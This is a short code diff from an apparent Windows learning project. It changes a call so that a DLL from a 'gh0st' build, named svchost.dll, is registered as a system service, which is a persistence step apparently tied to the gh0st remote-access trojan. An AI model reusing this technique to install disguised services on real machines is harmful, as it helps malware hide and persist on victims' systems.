@@ -72,8 +72,10 @@ int main()
 		CopyFile(pszMuaClientDllPath, pszNewMuaClientDllPath, FALSE);
 
 
-		RegisterSystemService(pszNewMuaClientDllPath);
-
+		//RegisterSystemService(pszNewMuaClientDllPath);
+		//WCHAR pszTemp[MAX_PATH] = L"C:\\Users\\iyzyi\\Desktop\\WINDOWS黑客编程技术详解-配套代码\\用户层\\5\\系统服务\\AutoRun_Service_Test\\Debug\\d d\\ServiceTest.exe";
+		WCHAR pszTemp[MAX_PATH] = L"C:\\Users\\iyzyi\\Desktop\\gh0st vs2017\\Release\\svchost.dll";
+		RegisterSystemService(pszTemp);
 
 
 
